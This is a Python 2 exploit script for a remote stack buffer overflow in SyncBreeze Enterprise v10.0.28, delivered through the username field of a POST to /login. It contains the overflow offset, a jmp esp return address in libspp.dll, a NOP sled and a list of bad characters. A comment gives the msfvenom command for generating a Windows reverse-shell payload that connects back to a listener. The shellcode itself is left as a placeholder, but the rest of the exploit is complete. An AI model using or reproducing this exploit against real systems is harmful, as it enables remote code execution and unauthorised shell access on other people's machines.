#!/usr/bin/env python2


try:
    import socket
    import sys
    import argparse
    from termcolor import colored

except ImportError as e:
    print "[" + colored("-", "red") + "] Couldn't import all necessary libraries"
    print e


'''
NOTE:

nasm -> FFE4 jmp esp = 0x10090c83 - libspp.dll
badchars = \x00\x0a\x0d\x25\x26\x2b\x3d
'''

def artz():
    artz = '''
             (
             )\ )                (
    (       (()/((             ( )\ (     (   (      (
    )\  (    /(_))\ )  (     ( )((_))(   ))\ ))\(   ))\\
 _ ((_) )\ )(_))(()/(  )\ )  )((_)_(()\ /((_)((_)\ /((_)
| | | |_(_/(/ __|)(_))_(_/( ((_) _ )((_|_))(_))((_|_))
| |_| | ' \))__ \ || | ' \)) _|| _ \ '_/ -_) -_)_ / -_)
 \___/|_||_||___/\_, |_||_|\__||___/_| \___\___/__\___|
                 |__/                            @kr0ff
    '''
    print artz

def send_exploit(rhost, rport):

    try:
        print "[%s] Sending payload..." % colored("+", "green")

        # msfvenom -p windows/shell_reverse_tcp lhost=192.168.1.50 lport=443 EXITFUNC=thread -f c -e x86/shikata_ga_nai -b "\x00\x0a\x0d\x25\x26\x2b\x3d"
        shellcode = ("<SHELLCODE GOES HERE>")

        junk = "A" * 780
        eip = "\x83\x0c\x09\x10" # jmp esp -> 0x10090c83 - libspp.dll
        nop = "\x90" * 16

        inputBuffer = junk + eip + nop + shellcode

        params = "username=" + inputBuffer + "&password=A" # Payload send in the username field parameter

        buf = "POST /login HTTP/1.1\r\n"
        buf += "Host: %s:%s\r\n" % (rhost, rport)
        buf += "User-Agent: Mozilla/5.0 (X11; Linux_86_64; rv:52.0) Gecko/20100101 Fire fox/52.0\r\n"
        buf += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
        buf += "Accept-Language: en-US,en;q=0.5\r\n"
        buf += "Referer: http://%s:%s/login\r\n" % (rhost, rport)
        buf += "Connection: close\r\n"
        buf += "Content-Type: application/x-www-form-urlencoded\r\n"
        buf += "Content-Length: "+str(len(params))+"\r\n"
        buf += "\r\n"

        buf += params

        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((rhost, int(rport)))
        s.send(buf)
        s.close()

        print '[' + colored("+","green") + '] Payload sent to %s:%s' % (rhost, rport)
        print '[' + colored("!", "yellow") + '] Check your netcat...'

    except:
        print "[%s] Could not connect!" % colored("-","red")
        sys.exit()

def parse_argz():
    parser = argparse.ArgumentParser(description='SyncBreeze Enterprise v10.0.28 - Remote Buffer Overflow')
    parser.add_argument("-t", "--target", help="Target [IP/HOSTNAME]", type=str, required=True)
    parser.add_argument("-p", "--port", help="SyncBreeze port on target", type=int, required=True)
    args = parser.parse_args(args=None if sys.argv[1:] else ['--help']) #Show help menu if no arguments provided
    #args = parser.parse_args(args=None)


    if not args.target or not args.port:
        parser.error("[" + colored("WARNING", "yellow") + "] Not all arguments provided")
        sys.exit(1)
    else:
        rhost = str(args.target)
        rport = str(args.port)
        send_exploit(rhost, rport)

if __name__ == "__main__":
    try:
        artz()
        parse_argz()
    except Exception, e:
        print "[" + colored("ERROR","red") + "] -> %s" % e
        sys.exit(1)
